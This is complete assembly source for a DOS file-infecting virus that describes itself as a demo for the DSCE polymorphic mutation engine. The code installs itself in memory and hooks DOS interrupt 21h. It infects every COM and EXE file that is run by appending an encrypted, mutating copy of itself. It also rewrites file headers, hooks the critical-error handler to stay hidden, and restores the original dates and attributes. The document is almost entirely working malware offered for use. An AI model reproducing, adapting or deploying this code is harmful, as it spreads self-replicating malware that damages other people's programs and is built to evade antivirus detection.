; A DEMO VIRUS FOR DSCE BY [PF]
.286

DEMO        SEGMENT
            ASSUME  CS:DEMO,DS:DEMO
            ORG     0000

VIR_LEN     EQU     OFFSET DSCE_END

            EXTRN   DSCE:NEAR,DSCE_END:NEAR

START:      CALL    BEG

BEG         PROC
BEG         ENDP

            CLD
            MOV     AH,62H
            INT     21H
            MOV     ES,BX
            POP     AX
            SUB     AX,3
            SHR     AX,4
            MOV     DX,CS
            ADD     AX,DX
            PUSH    AX
            PUSH    OFFSET CHK_MEMVIR
            RETF
CHK_MEMVIR: PUSH    CS
            POP     DS
            MOV     AX,4BDDH
            INT     21H
            CMP     AX,0DD4BH
            JZ      RUN_OLD
            MOV     PSP_1,ES
            MOV     PSP_2,ES
            MOV     PSP_3,ES
            MOV     BX,VIR_LEN
            MOV     WORD PTR [BX],0A4F3H
            MOV     BYTE PTR [BX+2],0CBH
            XOR     DI,DI
            MOV     SI,DI
            MOV     AX,ES
            ADD     AX,10H
            MOV     ES,AX
            MOV     CX,VIR_LEN
            PUSH    ES
            MOV     AX,OFFSET CON
            PUSH    AX
            CLD
            JMP     BX

RUN_OLD:    PUSH    ES
            POP     DS
            CMP     CS:FILE_MODE,0
            JNZ     RUN_EXE
            MOV     AX,CS:COM_HEAD1
            MOV     DS:[0100H],AX
            MOV     AH,CS:COM_HEAD2
            MOV     DS:[0102H],AH
            MOV     AX,0100H
            MOV     SP,0FFFEH
            PUSH    DS
            PUSH    AX
            RETF
RUN_EXE:    MOV     AX,ES
            ADD     AX,10H
            ADD     CS:EXE_SS,AX
            ADD     CS:EXE_CS,AX
            CLI
            MOV     SS,CS:EXE_SS
            MOV     SP,CS:EXE_SP
            STI
            JMP     DWORD PTR CS:EXE_IP

RUN_OLD_M2: MOV     AX,CS
            MOV     BX,VIR_LEN
            ADD     BX,200H
            CLI
            MOV     SS,AX
            MOV     SP,BX
            STI
            MOV     AH,4AH
            MOV     BX,VIR_LEN
            ADD     BX,BX
            SHR     BX,4
            ADD     BX,200H
            MOV     ES,PSP_1
            INT     21H
            MOV     ES,ES:[2CH]
            XOR     DI,DI
            XOR     AX,AX
            MOV     CX,0FFFFH
GET_NAME:   REPNZ   SCASB
            CMP     AL,ES:[DI]
            LOOPNZ  GET_NAME
            ADD     DI,3
            MOV     RUN_DX,DI
            MOV     RUN_DS,ES
            PUSH    CS
            POP     ES
            MOV     AX,4B00H
            MOV     BX,OFFSET PCB
            LDS     DX,DWORD PTR CS:RUN_DX
            INT     21H

            MOV     AH,4DH
            INT     21H
            MOV     AH,31H
            MOV     DX,VIR_LEN
            ADD     DX,DX
            SHR     DX,4
            ADD     DX,0F0H
            INT     21H

CON:        PUSH    CS
            POP     DS
            MOV     AX,3521H
            INT     21H
            MOV     INT21_IP,BX
            MOV     INT21_CS,ES
            MOV     DX,OFFSET INT21
            MOV     AX,2521H
            INT     21H
            JMP     RUN_OLD_M2

INT21_IP    DW      ?
INT21_CS    DW      ?
INT24_IP    DW      ?
INT24_CS    DW      ?
RUN_DX      DW      ?
RUN_DS      DW      ?
COM_HEAD1   DW      20CDH
COM_HEAD2   DB      ?

EXE_HEAD    DW       ?
EXE_02H     DW       ?
EXE_04H     DW       ?
            DW       ?
EXE_08H     DW       ?
            DW       2 DUP(?)
EXE_SS      DW       ?
EXE_SP      DW       ?
            DW       ?
EXE_IP      DW       ?
EXE_CS      DW       ?

NEW_SIZE_L  DW       ?
NEW_SIZE_H  DW       ?

PCB         DW       0
            DW       80H
PSP_1       DW       ?
            DW       5CH
PSP_2       DW       ?
            DW       6CH
PSP_3       DW       ?

PATH_DX     DW       ?
PATH_DS     DW       ?
DATE_CX     DW       ?
DATE_DX     DW       ?

FILE_MODE   DB       0
FILE_ATR    DW       ?
FILE_LEN    DW       ?

POP_BUFFER  DW       ?
VIR_BUFFER  DB       20H DUP (?)

SP_BUF      DW       ?
SS_BUF      DW       ?

VIR_MSG     DB       "This is a DSCE's Demo Virus written by [P.F]"

INT21:      PUSHF
            CLD
            CALL     INF_PUSH
            CMP      AX,4BDDH
            JNZ      I21_CON
            CALL     INF_POP
            MOV      AX,0DD4BH
            POPF
            IRET

I21_CON:    CMP      AX,4B00H
            JZ       I21_RUN
I21_END:    CALL     INF_POP
            POPF
            JMP      DWORD PTR CS:INT21_IP
I21_CLOSE:  MOV      AH,3EH
            INT      21H
            JMP      I21_END
I21_RUN:    MOV      CS:PATH_DS,DS
            MOV      CS:PATH_DX,DX
            MOV      AX,3D00H
            INT      21H
I21_END_L1: JC       I21_END
            XCHG     AX,BX
            PUSH     CS
            POP      DS
            MOV      AX,5700H
            INT      21H
            CMP      DX,0C800H
            JA       I21_CLOSE
            MOV      DATE_CX,CX
            MOV      DATE_DX,DX
            MOV      AH,3FH
            MOV      CX,3
            MOV      DX,OFFSET COM_HEAD1
            INT      21H
            CMP      AX,CX
            JNZ      I21_CLOSE
            CMP      COM_HEAD1,4D5AH
            JZ       SET_MODE
            CMP      COM_HEAD1,5A4DH
            JNZ      SET_M_COM
SET_MODE:   MOV      FILE_MODE,1
            MOV      AX,4200H
            XOR      CX,CX
            XOR      DX,DX
            INT      21H
            MOV      AH,3FH
            MOV      CX,18H
            MOV      DX,OFFSET EXE_HEAD
            INT      21H
            JMP      SHORT I21_OPEN
SET_M_COM:  MOV      FILE_MODE,0
            MOV      AX,4202H
            XOR      CX,CX
            XOR      DX,DX
            INT      21H
            OR       DX,DX
            JNZ      I21_CLOSE
            CMP      AX,0C000H
            JA       I21_CLOSE
            MOV      FILE_LEN,AX
I21_OPEN:   MOV      AH,3EH
            INT      21H
            PUSH     PATH_DX
            PUSH     PATH_DS
            POP      DS
            POP      DX
            MOV      AX,4300H
            INT      21H
            JC       I21_END_L1
            MOV      CS:FILE_ATR,CX
            MOV      AX,4301H
            XOR      CX,CX
            INT      21H
            MOV      AX,3D02H
            INT      21H
            JC       I21_END_L2
            XCHG     AX,BX
            PUSH     CS
            POP      DS
            PUSH     BX
            MOV      AX,3524H
            INT      21H
            MOV      INT24_IP,BX
            MOV      INT24_CS,ES
            MOV      AX,2524H
            MOV      DX,OFFSET INT24
            INT      21H
            POP      BX
            CALL     WRITE
            MOV      AH,3EH
            INT      21H
            MOV      AX,2524H
            PUSH     INT24_IP
            PUSH     INT24_CS
            POP      DS
            POP      DX
            INT      21H
            PUSH     CS:PATH_DX
            PUSH     CS:PATH_DS
            POP      DS
            POP      DX
            MOV      AX,4301H
            MOV      CX,CS:FILE_ATR
            INT      21H
I21_END_L2: JMP      I21_END

INT24:      XOR      AL,AL
            IRET

WRITE       PROC
            MOV      SP_BUF,SP
            MOV      SS_BUF,SS
            MOV      AX,VIR_LEN + 5DCH
            MOV      DX,CS
            CLI
            MOV      SS,DX
            MOV      SP,AX
            STI
            CMP      FILE_MODE,0
            JZ       WRITE_COM
            JMP      SHORT WRITE_EXE
WRITE_COM:  MOV      SI,OFFSET VIR_BUFFER
            MOV      BYTE PTR [SI],0E9H
            MOV      AX,FILE_LEN
            PUSH     AX
            SUB      AX,3
            MOV      [SI+1],AX
            MOV      AX,4200H
            XOR      CX,CX
            XOR      DX,DX
            INT      21H
            MOV      AH,40H
            MOV      DX,SI
            MOV      CX,3
            INT      21H
            MOV      AX,4202H
            XOR      CX,CX
            XOR      DX,DX
            INT      21H
            MOV      AX,VIR_LEN + 600H
            MOV      DX,CS
            SHR      AX,4
            INC      AX
            ADD      AX,DX
            MOV      ES,AX
            MOV      DX,OFFSET START
            MOV      CX,VIR_LEN
            POP      BP
            ADD      BP,0100H
            PUSH     BX
            MOV      BL,10B

            CALL     DSCE

            POP      BX
            MOV      AH,40H
            INT      21H
            PUSH     CS
            POP      DS

SET_DATE:   MOV      AX,5701H
            MOV      CX,DATE_CX
            MOV      DX,DATE_DX
            ADD      DX,0C800H
            INT      21H
            MOV      AX,SP_BUF
            MOV      DX,SS_BUF
            CLI
            MOV      SS,DX
            MOV      SP,AX
            STI
            RET

WRITE_EXE:  PUSH     CS
            POP      ES
            MOV      SI,OFFSET EXE_HEAD
            MOV      DI,OFFSET VIR_BUFFER
            MOV      CX,18H
            REP      MOVSB
            MOV      AX,4202H
            XOR      CX,CX
            XOR      DX,DX
            INT      21H
            ADD      AX,0FH
            ADC      DX,0
            AND      AX,0FFF0H
            MOV      NEW_SIZE_L,AX
            MOV      NEW_SIZE_H,DX
            MOV      CX,10H
            DIV      CX
            MOV      DI,OFFSET VIR_BUFFER
            SUB      AX,[DI+8]
            MOV      [DI+16H],AX
            MOV      [DI+0EH],AX
            MOV      WORD PTR [DI+14H],0
            MOV      [DI+10H],0FFFEH
            MOV      AX,4200H
            MOV      DX,NEW_SIZE_L
            MOV      CX,NEW_SIZE_H
            INT      21H
            MOV      AX,VIR_LEN + 600H
            MOV      DX,CS
            SHR      AX,4
            INC      AX
            ADD      AX,DX
            MOV      ES,AX
            MOV      DX,OFFSET START
            MOV      CX,VIR_LEN
            MOV      BP,0
            PUSH     BX
            MOV      BL,11B

            CALL     DSCE

            POP      BX
            MOV      AH,40H
            INT      21H
            PUSH     CS
            POP      DS

            MOV      AX,NEW_SIZE_L
            MOV      DX,NEW_SIZE_H
            ADD      AX,CX
            ADC      DX,0
            MOV      CX,200H
            MOV      DI,OFFSET VIR_BUFFER
            DIV      CX
            OR       DX,DX
            JZ       GET_NEW
            INC      AX
GET_NEW:    MOV      [DI+4],AX
            MOV      [DI+2],DX
            MOV      AX,4200H
            XOR      CX,CX
            XOR      DX,DX
            INT      21H
            MOV      AH,40H
            MOV      CX,18H
            MOV      DX,DI
            INT      21H
            JMP      SET_DATE
WRITE       ENDP

INF_PUSH    PROC
            POP      CS:POP_BUFFER
            PUSH     AX
            PUSH     BX
            PUSH     CX
            PUSH     DX
            PUSH     SI
            PUSH     DI
            PUSH     BP
            PUSH     DS
            PUSH     ES
            JMP      CS:POP_BUFFER
INF_PUSH    ENDP

INF_POP     PROC
            POP      CS:POP_BUFFER
            POP      ES
            POP      DS
            POP      BP
            POP      DI
            POP      SI
            POP      DX
            POP      CX
            POP      BX
            POP      AX
            JMP      CS:POP_BUFFER
INF_POP     ENDP

DEMO        ENDS
            END     START
